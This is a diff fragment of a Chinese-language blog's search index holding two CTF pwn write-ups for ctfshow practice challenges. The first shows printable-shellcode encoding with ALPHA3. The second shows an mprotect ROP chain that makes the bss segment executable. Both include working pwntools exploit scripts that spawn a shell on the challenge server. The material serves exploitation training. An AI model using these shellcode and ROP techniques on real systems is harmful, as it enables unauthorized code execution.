+<p>使用 <code>_write</code> 函数向标准输出打印提示信息 <code>&quot;Input you Shellcode\n&quot;</code>。</p>
+<p><strong>读取用户输入</strong>：</p>
+<p>使用 <code>_read</code> 函数从标准输入读取用户输入的数据，存储到缓冲区 <code>buf</code> 中。</p>
+<p><code>var_8</code> 存储了 <code>_read</code> 的返回值，表示实际读取的字节数。</p>
+<p><strong>检查输入长度</strong>：</p>
+<p>如果 <code>var_8 &gt; 0</code>，表示用户输入了数据，程序跳转到 <code>loc_11AC</code>。</p>
+<p>如果 <code>var_8 &lt;= 0</code>，表示用户没有输入任何内容，程序直接返回</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loc_11AC:</span><br><span class="line">    mov     [rbp+var_4], 0</span><br><span class="line">    jmp     loc_123A</span><br><span class="line"></span><br><span class="line">loc_11B8:</span><br><span class="line">    mov     eax, [rbp+var_4]</span><br><span class="line">    cdqe</span><br><span class="line">    movzx   eax, [rbp+rax+buf]</span><br><span class="line">    cmp     al, 60h ; &#x27;`&#x27;</span><br><span class="line">    jle     short loc_11DA</span><br><span class="line">    mov     eax, [rbp+var_4]</span><br><span class="line">    cdqe</span><br><span class="line">    movzx   eax, [rbp+rax+buf]</span><br><span class="line">    cmp     al, 7Ah ; &#x27;z&#x27;</span><br><span class="line">    jle     short loc_1236</span><br><span class="line">    jmp     loc_11DA</span><br><span class="line"></span><br><span class="line">loc_11DA:</span><br><span class="line">    mov     eax, [rbp+var_4]</span><br><span class="line">    cdqe</span><br><span class="line">    movzx   eax, [rbp+rax+buf]</span><br><span class="line">    cmp     al, 40h ; &#x27;@&#x27;</span><br><span class="line">    jle     short loc_11FC</span><br><span class="line">    mov     eax, [rbp+var_4]</span><br><span class="line">    cdqe</span><br><span class="line">    movzx   eax, [rbp+rax+buf]</span><br><span class="line">    cmp     al, 5Ah ; &#x27;Z&#x27;</span><br><span class="line">    jle     short loc_1236</span><br><span class="line">    jmp     loc_11FC</span><br><span class="line"></span><br><span class="line">loc_11FC:</span><br><span class="line">    mov     eax, [rbp+var_4]</span><br><span class="line">    cdqe</span><br><span class="line">    movzx   eax, [rbp+rax+buf]</span><br><span class="line">    cmp     al, 2Fh ; &#x27;/&#x27;</span><br><span class="line">    jle     short loc_121E</span><br><span class="line">    mov     eax, [rbp+var_4]</span><br><span class="line">    cdqe</span><br><span class="line">    movzx   eax, [rbp+rax+buf]</span><br><span class="line">    cmp     al, 5Ah ; &#x27;Z&#x27;</span><br><span class="line">    jle     short loc_1236</span><br><span class="line">    jmp     loc_121E</span><br><span class="line"></span><br><span class="line">loc_121E:</span><br><span class="line">    lea     rdi, format</span><br><span class="line">    mov     eax, 0</span><br><span class="line">    call    _printf</span><br><span class="line">    mov     eax, 0</span><br><span class="line">    jmp     locret_1254</span><br><span class="line"></span><br><span class="line">loc_1236:</span><br><span class="line">    add     [rbp+var_4], 1</span><br><span class="line">    jmp     loc_123A</span><br><span class="line"></span><br><span class="line">loc_123A:</span><br><span class="line">    mov     eax, [rbp+var_4]</span><br><span class="line">    cmp     eax, [rbp+var_8]</span><br><span class="line">    jl      loc_11B8</span><br><span class="line">    lea     rax, [rbp+buf]</span><br><span class="line">    call    rax</span><br><span class="line">    mov     eax, 0</span><br><span class="line">locret_1254:</span><br><span class="line">    leave</span><br><span class="line">    retn</span><br></pre></td></tr></table></figure>
+
+<p><strong>初始化索引</strong>：</p>
+<p>在 <code>loc_11AC</code>，程序将 <code>var_4</code> 初始化为 <code>0</code>。</p>
+<p><strong>循环检查输入内容</strong>：</p>
+<p>在 <code>loc_11B8</code>，程序逐字节检查用户输入的内容：</p>
+<p>如果字节值在 <code>[0x2F, 0x5A]</code> 或 <code>[0x40, 0x5A]</code> 或 <code>[0x60, 0x7A]</code> 范围内，程序继续检查下一个字节。</p>
+<p><strong>[0x2F, 0x5A]：</strong><code>/</code> 到 <code>Z</code>（包括大小写字母和一些符号）</p>
+<p><strong>[0x40, 0x5A]：</strong><code>@</code> 到 <code>Z</code>（主要是大写字母和一些符号）</p>
+<p>**[0x60, 0x7A]**：&#96;到  z（主要是小写字母和一些符号）</p>
+<p>如果字节值不在上述范围内，程序打印 <code>&quot;Good,but not right&quot;</code> 并返回。</p>
+<p><strong>执行用户输入</strong>：</p>
+<p>如果所有字节都满足条件，程序会将 <code>buf</code> 的地址加载到寄存器 <code>rax</code> 中，并调用 <code>buf</code>。这意味着程序会尝试执行用户输入的内容</p>
+<p>这些范围正好是ASSCII码的范围，我们可以直接将shellcode输入到buf，后面程序就会调用，但是输入的shellcode需要是可见字符string.printable</p>
+<p>生成可见字符shellcode使用alpha3就可以生成</p>
+<h2 id="alpha03"><a href="#alpha03" class="headerlink" title="alpha03"></a>alpha03</h2><h3 id="1-生成shellcode"><a href="#1-生成shellcode" class="headerlink" title="1.生成shellcode"></a>1.生成shellcode</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;sc&#x27;</span>, <span class="string">&#x27;bw&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(sc)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-将上述代码保存成sc-py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件"><a href="#2-将上述代码保存成sc-py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件" class="headerlink" title="2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件"></a>2.将上述代码保存成sc.py放到alpha3目录下，然后执行如下命令生成待编码的shellcode文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sc.py &gt; sc</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.使用alpha3生成string.printable （这里得用 python2）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;  #这里的参数 rax 是需要填入执行 shellcode 的那个寄存器（call                                                              rax）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode=<span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/31/shellcode2/Users\He\myblog\source_posts\shellcode2\image-20250131165007290.png" alt="image-20250131165007290"></p>
+<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28139</span>)</span><br><span class="line">shellcode=<span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">payload = shellcode </span><br><span class="line">io.send(payload)   <span class="comment">#注意不能用sendline换行符不在区间里</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -761,6 +770,74 @@
       </categories>
       <tags>
         <tag>知识点</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mprotect函数</title>
+    <url>/2025/01/24/mprotect%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="一、mprotect-函数"><a href="#一、mprotect-函数" class="headerlink" title="一、mprotect() 函数"></a>一、<code>mprotect()</code> 函数</h1><h2 id="（1）mprotect-函数简介"><a href="#（1）mprotect-函数简介" class="headerlink" title="（1）mprotect() 函数简介"></a>（1）<code>mprotect()</code> 函数简介</h2><p>在二进制漏洞利用（Pwn）中，<code>mprotect()</code> 函数是一个非常重要的系统调用，它用于修改内存区域的访问权限。这在漏洞利用中很有用，例如当你想要在一段原本不可执行的内存区域中执行 shellcode 时，就可以使用 <code>mprotect()</code> 函数将该区域的权限修改为可执行。</p>
+<h2 id="（2）mprotect-函数的原型"><a href="#（2）mprotect-函数的原型" class="headerlink" title="（2）mprotect() 函数的原型"></a>（2）<code>mprotect()</code> 函数的原型</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>addr</th>
+<th>len</th>
+<th>prot</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>修改权限的内存区域的起始地址，该地址必须是系统页大小（通常是 4096 字节）的整数倍</td>
+<td>修改权限的内存区域的长度，单位是字节</td>
+<td>指定新的内存访问权限</td>
+</tr>
+</tbody></table>
+<p><strong>内存访问权限：</strong></p>
+<table>
+<thead>
+<tr>
+<th>PROT_READ</th>
+<th>PROT_WRITE</th>
+<th>PROT_EXEC</th>
+<th>PROT_NONE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>允许读取该内存区域</td>
+<td>允许写入该内存区域</td>
+<td>允许执行该内存区域中的代码</td>
+<td>禁止对该内存区域进行任何访问</td>
+</tr>
+</tbody></table>
+<p><strong>注：一般prot直接修改为7，即可读可写可执行</strong></p>
+<h1 id="二、例题ctfshow49"><a href="#二、例题ctfshow49" class="headerlink" title="二、例题ctfshow49"></a>二、例题ctfshow49</h1><h2 id="（1）思路"><a href="#（1）思路" class="headerlink" title="（1）思路"></a>（1）思路</h2><p>我们可以通过栈溢出调用mprotect() 函数，将bss段修改为可读可写可执行，通过read函数将shellcode写入bss段，最后将返回地址改为bss段就可以</p>
+<p>但是mprotect函数需要设置三个参数，我们要找到一个含有三个pop一个ret指令的地址，将原有的参数pop走，再写入新的参数</p>
+<p>我们使用ROPgadge命令找到三个连续的寄存器  ROPgadget –binary pwn  –only “pop|ret”</p>
+<p><img src="/2025/01/24/mprotect%E5%87%BD%E6%95%B0/image-20250125111005854.png" alt="image-20250125111005854"></p>
+<p>pop_ebx_esi_ebp_ret &#x3D; 0x080a019b</p>
+<p>第一个参数：addr&#x3D;0x80d8000</p>
+<p>第二个参数：len&#x3D;0x1000</p>
+<p>第三个参数：port&#x3D;7</p>
+<p>同样read函数也需要设置三个参数</p>
+<p>在 C 语言里，<code>read</code> 函数的原型如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数解释：</strong></p>
+<p>fd：文件描述符，用于指定从哪个文件或设备读取数据（0标准输入；1标准输出；2错误输出）</p>
+<p>buf：指向用于存储读取数据的缓冲区的指针</p>
+<p>count：期望读取的最大字节数</p>
+<p>第一个参数：fd&#x3D;0</p>
+<p>第二个参数：buf&#x3D;0x80d8000（bss段任意一个地址就可以）</p>
+<p>第三个参数：count&#x3D;0x1000</p>
+<h2 id="（2）exp"><a href="#（2）exp" class="headerlink" title="（2）exp"></a>（2）exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28134</span>)</span><br><span class="line">mprotect= elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_ebx_esi_ebp_ret = <span class="number">0x080a019b</span></span><br><span class="line">shellcode = asm(shellcraft.sh())               <span class="comment">#生成shellcode</span></span><br><span class="line">addr=<span class="number">0x80d8000</span></span><br><span class="line">buf=<span class="number">0x80d8000</span></span><br><span class="line"><span class="built_in">len</span>=<span class="number">0x1000</span></span><br><span class="line">port=<span class="number">7</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">0x4</span>)+p32(mprotect)           <span class="comment">#将返回地址设为mprotect</span></span><br><span class="line">payload += p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(<span class="built_in">len</span>)+p32(port)   <span class="comment">#设置mprotect的参数</span></span><br><span class="line">payload += p32(read)                              <span class="comment">#将mprotect返回地址设为read</span></span><br><span class="line">payload +=p32(pop_ebx_esi_ebp_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="built_in">len</span>)               <span class="comment">#设置read的参数</span></span><br><span class="line">payload +=p32(buf)                               <span class="comment">#将read的返回地址设为buf（也就是shellcode）</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)                            <span class="comment">#将shellcode写入bss</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>第二周</category>
+      </categories>
+      <tags>
+        <tag>wp</tag>
       </tags>
   </entry>
 </search>
